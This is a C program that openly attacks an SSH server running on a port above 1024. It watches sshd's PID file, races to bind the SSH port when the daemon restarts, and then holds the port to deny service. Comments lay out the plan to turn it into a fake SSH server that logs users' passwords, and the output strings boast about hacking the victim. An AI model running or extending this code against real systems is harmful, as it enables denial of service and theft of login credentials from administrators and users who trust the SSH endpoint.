#include <errno.h>
#include <poll.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/inotify.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <limits.h>

#define PIDFILE "/var/run/sshd.pid"
#define CONFIGFILE "/etc/ssh/sshd_config"

unsigned int guessPort();

int main(int argc, char ** argv) {
	struct inotify_event *event;
	int fd, wd;

	// I don't like these C based APIs where I have to manually parse data :(
	char buf[1024];

	// Socket related thingies
	int sock;
	struct sockaddr_in sock_addr;
	struct in_addr sin_addr;

	int port = guessPort();
	printf("We guessed the port: %u\r\n", port);

	// Prepare our socket -- the more we can do now, the less chance we have of a race condition later
	sock = socket(AF_INET, SOCK_STREAM, 0);
	sock_addr.sin_family = AF_INET;
	sock_addr.sin_port = htons(port);
	sin_addr.s_addr = INADDR_ANY;
	sock_addr.sin_addr = sin_addr;

	// This SO_REUSEADDR option is *required* for this to work. Without it, we'll get an inuse error, even though it's not
	// More investigation required - http://unix.stackexchange.com/questions/162010/what-are-the-semantics-of-getting-a-eaddrinuse-when-no-listening-socket-is-bound
	int optval = 1;
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof (optval)) == -1) {
		printf("Failed to setsockopt (%u)\r\n", errno);
		exit(7); // There is no reason to continue, it won't work.
	}

	// Monitor the PID file
	// TODO: Monitor on /proc/PID if possible instead -- it'll work on more systems/distros
	fd = inotify_init1(IN_NONBLOCK);
	wd = inotify_add_watch(fd, PIDFILE, IN_ACCESS);
	// Note, we're monitoring for read, not delete. The reason for this is there's a small chance of a race condition here,
	//  and if we can get in a tiny bit before the delete and hammer it for 5 seconds, it'll lower the chance of us missing it
	// TODO: Test if this event is actually triggering right

	while (1) { // Our main loop where we try catch it!
		// TODO: We need to check whether our inotify event failed, and if so, add a new one on the new PID file or something
		int i = 0;
		int len = read(fd, buf, 1024); // This read call blocks, thankfully, otherwise we'd nom way too much CPU...
		// TODO: This shit totally doesn't block... should fix that
		while (i < len) {
			//event = (struct inotify_event *) &buf[i]; // not required because we don't care about the event itself
			// AW SNAP WE HEAAAAAAA
			// Try to get in there
			int res, attempts;
			while (bind(sock, (struct sockaddr *) &sock_addr, sizeof (struct sockaddr_in)) == -1) {
				printf(":( brokepoke.png (%u)\r\n", errno);
				if (attempts++ > 1000) exit(1); // TODO: just wait till next time if we fail here
				usleep(1); // Risky sleeping here...
			}
			// Hey! Listen ^.^
			res = listen(sock, 20);
			if (res == 0) {
				printf("Aw shit, guess who just hacked the shit out of you? DAMN RIGHT, SHIT WAS ME\r\n");
				// Do some accepts?
				int res =accept(sock, NULL, NULL);
				printf("accept res: %i\r\n", res);
				// TODO: Rewrite this from a DoS to a proper exploit
				// e.g. simulate an SSH server, prompt for password, log it
				while (1) {
					sleep(INT_MAX);
				}
				exit(0);
			} else {
				printf(":( slowpoke.png (%u)\r\n", errno);
			}
			// So at this point... um... I doubt anyone is going to send us another event... we should probably just like... end it. END IT ALL.
			exit(1); // 1 for we couldn't hax them I guess
		}
	}

	return 0;
}

unsigned int guessPort() {
	int port = 0;
	// Attempt to read out the SSH configuration file and ghetto parse it
	FILE *fp = fopen(CONFIGFILE, "r");
	if (fp != NULL) {
		// At least we can read the file...
		// Parse it line by line looking for "Port"
		char * line = NULL;
		size_t len = 0;
		ssize_t read = 0;
		while ((read = getline(&line, &len, fp)) != -1) {
			if (strncasecmp("Port ", line, 5) == 0) {
				// Matching line found!
				char * sport = calloc(6, sizeof(char)); // 6 bytes is probably enough. Fuck anyone messing with us above that
				strncpy(sport, line + 5, read - 6); // We don't need to copy the newline or null byte, and we start from after the Port
				// Convert it to an integer and check if it's > 1024
				int portguess = atoi(sport);
				free(sport);
				if (portguess > 1024) {
					port = portguess;
				}
			}
		}
		free(line);
		fclose(fp);
	}

	// TODO: Is there another method we could use here where we check the listening TCP sockets of the currently running SSH process?

	// If all other attempts fail, 2222 is a reasonable 'default' for a vuln instance
	if (port < 1) {
		port = 2222;
	}
	return port;
}
